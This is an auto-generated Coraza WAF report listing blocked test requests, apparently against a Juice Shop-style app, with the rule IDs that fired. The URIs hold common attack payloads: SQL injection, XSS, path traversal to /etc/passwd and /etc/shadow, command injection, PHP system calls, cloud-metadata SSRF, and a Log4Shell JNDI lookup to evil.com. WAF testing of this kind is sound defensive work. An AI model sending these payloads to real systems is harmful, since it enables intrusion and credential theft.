# Coraza WAF Attack Analysis Report
Generated on: 2026-03-07 15:43:49

| Status | URI | Rule ID | Message | Matched Data |
| :--- | :--- | :--- | :--- | :--- |
| 403 | `/rest/products/search?q='%20OR%201=1--` | **942100** | SQL Injection Attack Detected via libinjection | `s&1c found within ARGS:q: ' OR 1=1--` |
| 403 | `/rest/products/search?q='%20OR%201=1--` | **949110** | Inbound Anomaly Score Exceeded (Total Score: 20) | `-` |
| 403 | `/rest/products/search?q='%20UNION%20SELECT%20username,password%20FROM%20users--` | **942190** | Detects MSSQL code execution and information gathering attempts | `' UNION SELECT u found within ARGS:q: ' UNION SELECT username,password FROM users` |
| 403 | `/rest/products/search?q='%20UNION%20SELECT%20username,password%20FROM%20users--` | **942270** | Looking for basic sql injection. Common attack string for mysql, oracle and others | `UNION SELECT username,password FROM found within ARGS:q: ' UNION SELECT username,password FROM users--` |
| 403 | `/rest/products/search?q='%20UNION%20SELECT%20username,password%20FROM%20users--` | **942360** | Detects concatenated basic SQL injection and SQLLFI attempts | `' UNION SELECT found within ARGS:q: ' UNION SELECT username,password FROM users--` |
| 403 | `/rest/products/search?q='%20OR%20SLEEP(5)--` | **942160** | Detects blind sqli tests using sleep() or benchmark() | `SLEEP(5) found within ARGS:q: ' OR SLEEP(5)--` |
| 403 | `/rest/products/search?q=';%20DROP%20TABLE%20users;--` | **942350** | Detects MySQL UDF injection and other data/structure manipulation attempts | `; DROP TABLE found within ARGS:q: '; DROP TABLE users;--` |
| 403 | `/rest/products/search?q='%20OR%20BENCHMARK(1000000,SHA1('test'))--` | **942151** | SQL Injection Attack | `benchmark( found within ARGS:q: ' or benchmark(1000000,sha1('test'))--` |
| 403 | `/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E` | **941100** | XSS Attack Detected via libinjection | `XSS data found within ARGS:q: <script>alert(1)</script>` |
| 403 | `/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E` | **941110** | XSS Filter - Category 1: Script Tag Vector | `<script> found within ARGS:q: <script>alert(1)</script>` |
| 403 | `/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E` | **941160** | NoScript XSS InjectionChecker: HTML Injection | `<script found within ARGS:q: <script>alert(1)</script>` |
| 403 | `/rest/products/search?q=%3Ca%20href=javascript:alert(1)%3Eclick%3C/a%3E` | **941170** | NoScript XSS InjectionChecker: Attribute Injection | `=javascript:alert(1)>click< found within ARGS:q: <a href=javascript:alert(1)>click</a>` |
| 403 | `/rest/products/search?q=%3Ca%20href=javascript:alert(1)%3Eclick%3C/a%3E` | **941210** | IE XSS Filters - Attack Detected | `javascript:a found within ARGS:q: <a href=javascript:alert(1)>click</a>` |
| 403 | `/rest/products/search?q=../../../../etc/passwd` | **990001** | Custom LFI Protection: etc/passwd access denied | `-` |
| 403 | `/etc/shadow` | **990002** | Custom LFI Protection: etc/shadow access denied | `-` |
| 403 | `/windows/system32/drivers/etc/hosts` | **990003** | Custom LFI Protection: Windows System32 access denied | `-` |
| 403 | `/ftp/%252e%252e%252f%252e%252e%252fetc/passwd` | **930100** | Path Traversal Attack (/../) or (/.../) | `/%252e%252e%252f found within REQUEST_URI_RAW: /ftp/%252e%252e%252f%252e%252e%252fetc/passwd` |
| 403 | `/rest/products/search?q=%7Cwhoami` | **932105** | Remote Command Execution: Unix Command Injection | `|whoami found within ARGS:q: |whoami` |
| 403 | `/rest/products/search?q=%7Cwhoami` | **932115** | Remote Command Execution: Windows Command Injection | `|whoami found within ARGS:q: |whoami` |
| 403 | `/rest/products/search?q=%60id%60` | **990004** | Custom CMDi Protection: Backtick operator detected | `-` |
| 403 | `/rest/products/search?q=%7Cls%20-la%20/etc/` | **932100** | Remote Command Execution: Unix Command Injection | `|ls found within ARGS:q: |ls -la /etc/` |
| 403 | `/rest/products/search?q=%3C?php%20system('id');%20?%3E` | **933100** | PHP Injection Attack: PHP Open Tag Found | `<?p found within ARGS:q: <?php system('id'); ?>` |
| 403 | `/rest/products/search?q=%3C?php%20system('id');%20?%3E` | **933160** | PHP Injection Attack: High-Risk PHP Function Call Found | `system('id') found within ARGS:q: <?php system('id'); ?>` |
| 403 | `/rest/products/search?q=http://127.0.0.1:22` | **931100** | Possible Remote File Inclusion (RFI) Attack: URL Parameter using IP Address | `http://127.0.0.1 found within ARGS:q: http://127.0.0.1:22` |
| 403 | `/rest/products/search?q=http://169.254.169.254/latest/meta-data/` | **934110** | Possible Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter | `http://169.254.169.254/latest/ found within ARGS:q: http://169.254.169.254/latest/meta-data/` |
| 403 | `/rest/products/search?q=$%7Bjndi:ldap://evil.com/a%7D` | **932130** | Remote Command Execution: Unix Shell Expression Found | `${jndi:ldap://evil.com/a} found within ARGS:q: ${jndi:ldap://evil.com/a}` |
| 403 | `/rest/products/search?q=$%7Bjndi:ldap://evil.com/a%7D` | **944150** | Potential Remote Command Execution: Log4j / Log4shell | `-` |
| 403 | `/rest/products/search?q=%0d%0aInjected-Header:true` | **990006** | Custom Protocol Protection: CRLF Injection detected | `-` |
| 403 | `/rest/products/search?q=%0d%0aHTTP/1.1%20200%20OK` | **921130** | HTTP Response Splitting Attack | `http/1 found within ARGS:q: \\r\\nhttp/1.1 200 ok` |
| 403 | `/` | **913100** | Found User-Agent associated with security scanner | `Nikto found within REQUEST_HEADERS:User-Agent: Nikto/2.1.5` |
| 403 | `/api/Products` | **200002** | Failed to parse request body. | `-` |
| 403 | `/rest/user/login` | **990008** | Custom NoSQLi Protection: MongoDB operator detected | `-` |
| 403 | `/rest/track-order/1'%20OR%20'1'=='1` | **990009** | Custom NoSQLi Protection: URI based NoSQLi detected | `-` |
| 403 | `/rest/track-order/1';%20$where:%20'1'=='1'` | **990010** | Custom NoSQLi Protection: $where operator detected | `-` |
| 403 | `/rest/user/reset-password?email=%7B%7B7*7%7D%7D` | **990011** | Custom SSTI Protection: Handlebars Template markers detected | `-` |
| 403 | `/api/Users` | **934130** | JavaScript Prototype Pollution | `__proto__ found within ARGS_NAMES:json.__proto__.admin: json.__proto__.admin` |